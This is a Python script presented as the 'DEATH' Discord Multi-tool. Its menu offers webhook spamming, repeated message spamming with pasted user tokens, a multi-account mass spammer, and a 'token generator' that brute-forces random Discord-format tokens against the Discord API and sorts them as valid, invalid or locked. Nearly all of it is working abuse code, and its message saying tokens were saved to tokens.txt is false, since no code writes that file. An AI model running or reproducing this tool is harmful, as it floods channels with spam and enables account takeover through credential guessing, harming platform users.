import os
import time
import random
from colorama import Fore
from discord_webhook import DiscordWebhook
import requests



# ┻ ┳ ┣ ┫ ╋ ┏ ┓ ┗ ┛ ━ ┃


os.system('title DEATH')
user_name = os.getlogin()

print('\n' * 2)

print(Fore.RED + '            ▓█████▄ ▓█████ ▄▄▄     ▄▄▄█████▓ ██░ ██  ▄████▄   ▒█████   ██▀███  ▓█████▄ ')
time.sleep(0.06)
print(Fore.RED + '            ▒██▀ ██▌▓█   ▀▒████▄   ▓  ██▒ ▓▒▓██░ ██▒▒██▀ ▀█  ▒██▒  ██▒▓██ ▒ ██▒▒██▀ ██▌')
time.sleep(0.06)
print(Fore.RED + '            ░██   █▌▒███  ▒██  ▀█▄ ▒ ▓██░ ▒░▒██▀▀██░▒▓█    ▄ ▒██░  ██▒▓██ ░▄█ ▒░██   █▌')
time.sleep(0.06)
print(Fore.RED + '            ░▓█▄   ▌▒▓█  ▄░██▄▄▄▄██░ ▓██▓ ░ ░▓█ ░██ ▒▓▓▄ ▄██▒▒██   ██░▒██▀▀█▄  ░▓█▄   ▌')
time.sleep(0.06)
print(Fore.RED + '            ░▒████▓ ░▒████▒▓█   ▓██▒ ▒██▒ ░ ░▓█▒░██▓▒ ▓███▀ ░░ ████▓▒░░██▓ ▒██▒░▒████▓')
time.sleep(0.06)
print(Fore.RED + '             ▒▒▓  ▒ ░░ ▒░ ░▒▒   ▓▒█░ ▒ ░░    ▒ ░░▒░▒░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░ ▒▒▓  ▒')
time.sleep(0.06)
print(Fore.RED + '             ░ ▒  ▒  ░ ░  ░ ▒   ▒▒ ░   ░     ▒ ░▒░ ░  ░  ▒     ░ ▒ ▒░   ░▒ ░ ▒░ ░ ▒  ▒')
time.sleep(0.06)
print(Fore.RED + '             ░ ░  ░    ░    ░   ▒    ░       ░  ░░ ░░        ░ ░ ░ ▒    ░░   ░  ░ ░  ░')
time.sleep(0.06)
print(Fore.RED + '               ░       ░  ░     ░  ░         ░  ░  ░░ ░          ░ ░     ░        ░')
time.sleep(0.06)
print(Fore.RED + '             ░                                      ░                           ░      ')
time.sleep(0.06)
print('                                         Discord Multi-tool')
time.sleep(0.06)

print('\n' * 2)
time.sleep(0.06)

print(Fore.RED + '┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓')
time.sleep(0.06)
print(Fore.RED + f'┃ {Fore.RESET}[{Fore.LIGHTRED_EX}1{Fore.RESET}] {Fore.RED}-{Fore.RESET} Webhook message sender{Fore.RESET}                                                                   {Fore.RED}┃')
time.sleep(0.06)
print(Fore.RED + f'┃ {Fore.RESET}[{Fore.LIGHTRED_EX}2{Fore.RESET}] {Fore.RED}-{Fore.RESET} Webhook spamer{Fore.RESET}                                                                           {Fore.RED}┃')
time.sleep(0.06)
print(Fore.RED + f'┃ {Fore.RESET}[{Fore.LIGHTRED_EX}3{Fore.RESET}] {Fore.RED}-{Fore.RESET} Message spamer{Fore.RESET}                                                                           {Fore.RED}┃')
time.sleep(0.06)
print(Fore.RED + f'┃ {Fore.RESET}[{Fore.LIGHTRED_EX}4{Fore.RESET}] {Fore.RED}-{Fore.RESET} Generate tokens{Fore.RESET}                                                                          {Fore.RED}┃')
time.sleep(0.06)
print(Fore.RED + f'┃ {Fore.RESET}[{Fore.LIGHTRED_EX}5{Fore.RESET}] {Fore.RED}-{Fore.RESET} Massive users spam{Fore.RESET}                                                                       {Fore.RED}┃')
time.sleep(0.06)
print(Fore.RED + '┃                                                                                                ┃')
time.sleep(0.06)
print(Fore.RED + '┃                                                                                            V1.1┃')
time.sleep(0.06)
print(Fore.RED + '┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛')
time.sleep(0.06)

def death_cord():
    user_input = input(Fore.RED + f'[{Fore.LIGHTRED_EX}{user_name}{Fore.RED}]{Fore.RESET}: ')

    if user_input == '1':
        print('\n' * 3)
        webhook_url = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Paste the webhook url\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
        webhook_message = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Enter the webhook message\n{Fore.RED}┗{Fore.LIGHTRED_EX}')

        try:
            webhook = DiscordWebhook(url=webhook_url, content=webhook_message)
            response = webhook.execute()

            print(Fore.RED + f'Successfully sent {webhook_message}')
        except:
            print(Fore.RED + 'Something went wrong! Please check for mistakes.')
        death_cord()

    if user_input == '2':
        print('\n' * 3)
        webhook_url = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Paste the webhook url\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
        webhook_message = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Enter the webhook message\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
        webhook_repeat = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}How many times to send message?\n{Fore.RED}┗{Fore.LIGHTRED_EX}')

        try:
            for i in range(int(webhook_repeat)):
                webhook = DiscordWebhook(url=webhook_url, content=webhook_message)
                response = webhook.execute()

            print(Fore.RED + f'Successfully sent {webhook_message} {webhook_repeat} times')
        except:
            print(Fore.RED + 'Something went wrong! Please check for mistakes.')
        death_cord()
    if user_input == '3':
        spam_url = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Paste the request url\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
        authorization_text = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Paste the token\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
        spam_text = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Enter the spam text\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
        repeat_spam = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}How many times to send message?\n{Fore.RED}┗{Fore.LIGHTRED_EX}')

        payload = {'content': spam_text}

        header = {'authorization': authorization_text}

        for i in range(int(repeat_spam)):
            r = requests.post(spam_url, data=payload, headers=header)
        print(Fore.RED + f'Successfully sent {spam_text} {repeat_spam} times')

        death_cord()
    if user_input == '4':
        sample_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"
        create_amount = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}How many tokens to generate?\n{Fore.RED}┗{Fore.LIGHTRED_EX}')

        valid_tokens = []
        invalid_tokens = []
        locked_tokens = []
        notfound_tokens = []

        valid_tokens_am = 0
        invalid_tokens_am = 0
        locked_tokens_am = 0
        notfound_tokens_am = 0

        for i in range(int(create_amount)):
            first = ""
            second = ""
            third = ""

            for f in range(24):
                first += random.choice(sample_chars)

            for f in range(6):
                second += random.choice(f"{sample_chars}_")

            for f in range(27):
                third += random.choice(sample_chars)

            token = f"{first}.{second}.{third}"
            headers = {'Authorization': token}

            r = requests.get('https://discordapp.com/api/v9/guild-events', headers=headers)
            status = r.status_code

            print(Fore.RED + f'Checking ==> {token}, {r.status_code}')

            if r.status_code == 200:
                print(Fore.RED + f'Valid ==> {token}')
                valid_tokens.append(token)
                valid_tokens_am += 1

            elif r.status_code == 401:
                print(Fore.RED + f'Invalid ==> {token}')
                invalid_tokens.append(token)
                invalid_tokens_am += 1

            elif r.status_code == 403:
                print(Fore.RED + f'Locked ==> {token}')
                locked_tokens.append(token)
                locked_tokens_am += 1

            elif r.status_code == 404:
                print(Fore.RED + f'Not found ==> {token}')
                notfound_tokens.append(token)
                notfound_tokens_am += 1

        print(Fore.RED + f'Successfully generated {create_amount} tokens and saved in tokens.txt! Valid tokens: {valid_tokens_am}, invalid tokens: {invalid_tokens_am}, locked tokens: {locked_tokens_am}, not found tokens: {notfound_tokens_am}')

        death_cord()

    if user_input == '5':
        users = int(input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Users to spam (min 2, max 5)\n{Fore.RED}┗{Fore.LIGHTRED_EX}'))
        spam_url = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Paste the request url\n{Fore.RED}┗{Fore.LIGHTRED_EX}')


        if users == 2:
            authorization_text1 = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Paste the token for user №1\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
            authorization_text2 = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Paste the token for user №2\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
        elif users == 3:
            authorization_text1 = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Paste the token for user №1\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
            authorization_text2 = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Paste the token for user №2\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
            authorization_text3 = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Paste the token for user №3\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
        elif users == 4:
            authorization_text1 = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Paste the token for user №1\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
            authorization_text2 = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Paste the token for user №2\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
            authorization_text3 = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Paste the token for user №3\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
            authorization_text4 = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Paste the token for user №4\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
        elif users == 5:
            authorization_text1 = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Paste the token for user №1\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
            authorization_text2 = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Paste the token for user №2\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
            authorization_text3 = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Paste the token for user №3\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
            authorization_text4 = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Paste the token for user №4\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
            authorization_text5 = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Paste the token for user №5\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
        else:
            print(Fore.RED + 'Min is 2 users and Max is 5!')
            death_cord()

        spam_text = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Enter the spam text\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
        repeat_spam = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}How many times to send message?\n{Fore.RED}┗{Fore.LIGHTRED_EX}')

        payload = {'content': spam_text}

        if users == 2:
            header1 = {'authorization': authorization_text1}
            header2 = {'authorization': authorization_text2}
        elif users == 3:
            header1 = {'authorization': authorization_text1}
            header2 = {'authorization': authorization_text2}
            header3 = {'authorization': authorization_text3}
        elif users == 4:
            header1 = {'authorization': authorization_text1}
            header2 = {'authorization': authorization_text2}
            header3 = {'authorization': authorization_text3}
            header4 = {'authorization': authorization_text4}
        elif users == 5:
            header1 = {'authorization': authorization_text1}
            header2 = {'authorization': authorization_text2}
            header3 = {'authorization': authorization_text3}
            header4 = {'authorization': authorization_text4}
            header5 = {'authorization': authorization_text5}

        if users == 2:
            for i in range(int(repeat_spam)):
                r = requests.post(spam_url, data=payload, headers=header1)
                t = requests.post(spam_url, data=payload, headers=header2)
        elif users == 3:
            for i in range(int(repeat_spam)):
                r = requests.post(spam_url, data=payload, headers=header1)
                t = requests.post(spam_url, data=payload, headers=header2)
                i = requests.post(spam_url, data=payload, headers=header3)
        elif users == 4:
            for i in range(int(repeat_spam)):
                r = requests.post(spam_url, data=payload, headers=header1)
                t = requests.post(spam_url, data=payload, headers=header2)
                i = requests.post(spam_url, data=payload, headers=header3)
                o = requests.post(spam_url, data=payload, headers=header4)
        elif users == 5:
            for i in range(int(repeat_spam)):
                r = requests.post(spam_url, data=payload, headers=header1)
                t = requests.post(spam_url, data=payload, headers=header2)
                i = requests.post(spam_url, data=payload, headers=header3)
                o = requests.post(spam_url, data=payload, headers=header4)
                x = requests.post(spam_url, data=payload, headers=header5)

        print(Fore.RED + f'Successfully sent {spam_text} {repeat_spam} times with {users} users')
        death_cord()


death_cord()
